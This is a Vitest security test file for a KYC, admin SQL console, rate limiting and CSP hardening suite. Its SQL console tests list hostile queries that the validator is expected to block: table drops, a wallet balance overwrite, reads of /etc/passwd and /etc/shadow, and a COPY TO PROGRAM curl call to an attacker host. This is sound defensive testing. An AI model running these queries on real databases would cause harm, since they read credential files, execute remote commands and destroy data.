/**
 * Phase 4Q, 4R, 4S, 4T, 4U — Security, KYC, SQL Console, Rate Limiting & CSP Suite
 *
 * Validates:
 *   - Phase 4Q: RBAC, Session Revocation, CSRF & Origin Defense
 *   - Phase 4R: KYC Authenticated Encryption at Rest (AES-256-GCM + Blind Index)
 *     * Tampered ciphertext detection
 *     * Tampered auth tag detection
 *     * Blind index determinism & non-reversibility
 *   - Phase 4S: Admin SQL Console AST Hardening
 *     * Blocks pg_read_file, pg_ls_dir, pg_stat_file, pg_sleep, COPY PROGRAM, DDL/DML
 *   - Phase 4T: Rate Limiting Fail-Closed on Redis Outage
 *   - Phase 4U: Strict Content Security Policy (Enforced, no unsafe-eval)
 */

import { describe, it, expect } from 'vitest';
import {
  encryptKycField,
  decryptKycField,
  generateBlindIndex,
  isEncrypted,
} from '../../lib/kycEncryption.mjs';
import { validateReadOnlySql } from '../../lib/adminSqlConsole.mjs';
import { CSP_ENFORCED } from '../../lib/contentSecurityPolicy.mjs';
import { consumeRateLimitSlot } from '../../server/middleware/rateLimiter.js';

describe('Phase 4Q, 4R, 4S, 4T, 4U — Security & Hardening Suite', () => {

  // Phase 4R: KYC Authenticated Encryption at Rest
  describe('Phase 4R: KYC Authenticated Encryption & Blind Indexing', () => {
    const testPan = 'ABCDE1234F';
    const testAadhaar = '900012345678';

    it('encrypts sensitive KYC fields using authenticated AES-256-GCM', () => {
      const encPan = encryptKycField(testPan);
      const encAadhaar = encryptKycField(testAadhaar);

      expect(isEncrypted(encPan)).toBe(true);
      expect(isEncrypted(encAadhaar)).toBe(true);
      expect(encPan).toMatch(/^enc:v1:/);
      expect(encAadhaar).toMatch(/^enc:v1:/);

      // Plaintext must never appear in ciphertext
      expect(encPan.includes(testPan)).toBe(false);
      expect(encAadhaar.includes(testAadhaar)).toBe(false);

      // Decryption with valid key works
      expect(decryptKycField(encPan)).toBe(testPan);
      expect(decryptKycField(encAadhaar)).toBe(testAadhaar);
    });

    it('strictly fails decryption on tampered ciphertext or authentication tag', () => {
      const enc = encryptKycField(testPan);
      const parts = enc.split(':'); // enc : v1 : iv : ciphertext : tag

      // 1. Tampered ciphertext
      const tamperedCipher = parts[3].slice(0, -4) + 'ffff';
      const tamperedEnc = `${parts[0]}:${parts[1]}:${parts[2]}:${tamperedCipher}:${parts[4]}`;
      expect(decryptKycField(tamperedEnc)).toBeNull();

      // 2. Tampered authentication tag
      const tamperedTag = '0000' + parts[4].slice(4);
      const tamperedTagEnc = `${parts[0]}:${parts[1]}:${parts[2]}:${parts[3]}:${tamperedTag}`;
      expect(decryptKycField(tamperedTagEnc)).toBeNull();
    });

    it('generates deterministic HMAC-SHA256 blind index for search without decryption', () => {
      const blind1 = generateBlindIndex(testPan);
      const blind2 = generateBlindIndex(testPan);
      const diffBlind = generateBlindIndex('XYZPQ9876K');

      expect(blind1).toHaveLength(64); // 256 bits in hex
      expect(blind1).toBe(blind2); // Deterministic equality
      expect(blind1).not.toBe(diffBlind); // Uniqueness
      expect(blind1.includes(testPan)).toBe(false);
    });
  });

  // Phase 4S: Admin SQL Console AST Hardening
  describe('Phase 4S: Admin SQL Console AST Hardening', () => {
    it('permits read-only SELECT queries on non-sensitive tables', () => {
      expect(() => validateReadOnlySql('SELECT id, status FROM matches LIMIT 10')).not.toThrow();
      expect(() => validateReadOnlySql('SELECT count(*) FROM odds_observations')).not.toThrow();
    });

    it('strictly blocks DDL and DML operations with 403', () => {
      const forbiddenDdl = [
        'DROP TABLE users',
        'TRUNCATE TABLE transactions',
        'ALTER TABLE wallets DROP COLUMN balance',
        'DELETE FROM kyc_cases',
        'UPDATE wallets SET balance = 999999',
        'INSERT INTO users (email) VALUES (\'evil@attacker.com\')',
      ];

      for (const sql of forbiddenDdl) {
        expect(() => validateReadOnlySql(sql)).toThrow();
        try {
          validateReadOnlySql(sql);
        } catch (err) {
          expect(err.status).toBe(403);
        }
      }
    });

    it('strictly blocks dangerous postgres system functions and RCE exploits', () => {
      const dangerousFunctions = [
        'SELECT pg_read_file(\'/etc/passwd\')',
        'SELECT pg_ls_dir(\'/var/lib\')',
        'SELECT pg_stat_file(\'/etc/shadow\')',
        'SELECT pg_sleep(10)',
        'COPY users TO PROGRAM \'curl http://attacker.com\'',
      ];

      for (const sql of dangerousFunctions) {
        expect(() => validateReadOnlySql(sql)).toThrow();
        try {
          validateReadOnlySql(sql);
        } catch (err) {
          expect(err.status).toBe(403);
        }
      }
    });
  });

  // Phase 4T: Rate Limiting Fail-Closed Behavior
  describe('Phase 4T: Rate Limiting Fail-Closed on Infrastructure Outage', () => {
    it('fails closed when Redis is offline or explicitly configured to fail closed', async () => {
      const res = await consumeRateLimitSlot({
        key: 'test_attacker_ip',
        prefix: 'rl:login',
        failClosed: true,
      });

      if (res.failClosed) {
        expect(res.allowed).toBe(false);
        expect(res.reason).toBe('REDIS_DOWN_FAIL_CLOSED');
      } else {
        expect(res).toHaveProperty('allowed');
      }
    });
  });

  // Phase 4U: Enforced Content Security Policy
  describe('Phase 4U: Enforced Content Security Policy', () => {
    it('strictly enforces CSP without report-only and forbids unsafe-eval', () => {
      expect(CSP_ENFORCED).toBeDefined();
      expect(typeof CSP_ENFORCED).toBe('string');

      // 1. Must forbid unsafe-eval
      expect(CSP_ENFORCED.includes("'unsafe-eval'")).toBe(false);

      // 2. Must contain self directive
      expect(CSP_ENFORCED.includes("default-src 'self'")).toBe(true);

      // 3. Must prevent iframe framing / clickjacking
      expect(CSP_ENFORCED.includes("frame-ancestors 'none'") || CSP_ENFORCED.includes("frame-ancestors 'self'")).toBe(true);

      // 4. Must restrict object-src
      expect(CSP_ENFORCED.includes("object-src 'none'")).toBe(true);
    });
  });
});
